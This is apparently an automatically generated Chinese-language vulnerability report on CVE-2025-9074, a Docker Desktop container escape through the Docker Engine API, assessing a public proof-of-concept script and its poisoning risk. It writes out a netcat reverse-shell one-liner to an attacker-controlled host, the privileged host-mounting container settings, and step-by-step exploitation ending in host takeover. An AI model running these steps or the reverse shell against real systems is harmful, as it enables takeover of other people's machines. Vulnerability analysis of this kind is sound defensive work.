## CVE-2025-9074 - Docker Desktop 容器逃逸/权限提升

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/权限提升

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop for Windows/macOS versions prior to 4.44.3

**利用条件:** 本地运行的恶意Linux容器；无需认证；通过默认子网(192.168.65.7:2375)访问Docker Engine API

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-9074是一个影响Docker Desktop（Windows和macOS版本）的容器逃逸/权限提升漏洞，严重性评分为9.3（高危）。该漏洞允许在Docker Desktop环境中运行的恶意Linux容器绕过隔离机制，通过默认子网（192.168.65.7:2375）直接访问宿主机的Docker Engine API，进而实现对宿主机的完全控制。该漏洞不依赖于文件系统挂载，而是利用了Docker Engine API的默认暴露和不当配置。

**POC有效性分析:**
提供的POC是一个名为`cve-2025-9074.sh`的bash脚本，旨在利用此漏洞获取宿主机的反向shell。该脚本接收目标Docker Engine API地址（默认为192.168.65.7:2375）、攻击者监听IP和端口作为参数。POC的有效性在于其利用了Docker API的特定功能和配置。脚本首先使用`curl -s "${API}/version"`检查Docker API的可访问性，确保目标在线且响应。如果API可访问，脚本会构建一个精心构造的JSON payload。这个payload用于通过`/containers/create` API端点创建一个新的Docker容器，该容器具有以下关键配置：
1.  `Image: "alpine:latest"`: 使用一个轻量级的Linux镜像作为基础。
2.  `Cmd`: 包含一个标准的Netcat反向shell命令。该命令会在容器启动后执行，尝试连接回攻击者指定的监听IP和端口。具体命令为`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f`。
3.  `HostConfig.Binds: ["/:/hostfs:rw"]`: 这是容器逃逸的关键机制之一。它将宿主机的整个根文件系统挂载到容器内部的`/hostfs`路径，并且具有读写权限。这意味着容器内的进程可以直接访问和修改宿主机的文件。
4.  `HostConfig.Privileged: true`: 将容器设置为特权模式。特权容器拥有几乎与宿主机相同的权限，可以访问所有设备和执行系统调用，是突破容器隔离的重要一步。
5.  `HostConfig.NetworkMode: "host"`: 将容器的网络模式设置为`host`，这意味着容器会共享宿主机的网络命名空间，可以直接访问宿主机的网络接口，从而能够直接访问宿主机上未暴露的服务，例如默认子网上的Docker Engine API。
通过这些配置，即使是一个不被信任的或被感染的容器，也能够在未授权的情况下，利用宿主机上可访问的Docker Engine API，创建一个具有特权、挂载宿主机文件系统并拥有宿主机网络访问权限的新容器，从而轻松突破隔离，执行任意命令，获取宿主机的完全控制。POC通过启动这个包含反向shell的容器，成功演示了从容器到宿主机的逃逸。脚本的逻辑清晰，直接利用了漏洞的核心机制，因此具有高度的有效性。

**利用步骤:**
1.  **环境准备:** 确保目标系统运行的是受影响版本的Docker Desktop for Windows或macOS（版本低于4.44.3），并且存在一个可被恶意容器访问的Docker Engine API（默认子网地址为192.168.65.7，端口为2375）。
2.  **攻击者端监听:** 在攻击者的机器上启动一个Netcat监听器，等待反向shell连接。例如，使用命令：`nc -lvnp <listener_port>`。
3.  **执行POC:** 在恶意容器内部（或能够直接访问Docker API的其他环境，例如宿主机上的另一个容器），执行提供的`cve-2025-9074.sh`脚本。需要提供目标Docker API地址、攻击者机器的IP地址和监听端口。
    示例命令：`./cve-2025-9074.sh 192.168.65.7 2375 <attacker_ip> <listener_port>`
4.  **接收反向Shell:** 脚本执行成功后，将会在攻击者的Netcat监听器上收到来自宿主机的反向shell连接，从而获得宿主机的命令行访问权限。攻击者即可在宿主机上执行任意命令，实现完全控制。

**投毒风险分析:**
提供的POC代码的投毒风险极低。该POC是一个简洁的bash脚本，其所有操作都清晰可见，不包含任何混淆、加密或二进制组件。脚本的主要功能是通过`curl`命令向Docker Engine API发送HTTP请求，并利用合法的Docker API功能来创建和启动容器。脚本中用于建立反向shell的命令`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f`是标准的Linux管道和Netcat用法，其目的是将宿主机的shell输出重定向到攻击者的监听器，并将攻击者的输入发送给宿主机shell，实现交互式会话。这并非恶意代码本身，而是漏洞利用的最终效果，且其目标IP和端口是用户可控的参数，由攻击者自行指定。
代码中没有发现任何试图下载外部可疑文件、执行`eval`或其他动态代码执行、或者与未知第三方服务通信的行为。所有用到的工具（`curl`、`nc`、`/bin/sh`）都是标准的系统组件，其使用方式符合预期。此外，`README.md`文件明确包含了法律免责声明，强调该PoC仅用于教育和授权的安全测试目的，并警告未经授权的利用是非法和不道德的。这表明了作者的意图是出于防御性安全研究，而非传播恶意软件。综上所述，该POC代码透明度高，功能单一且符合描述，且有明确的免责声明，因此被恶意利用作为投毒载体的风险非常低。

**项目地址:** N/A

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
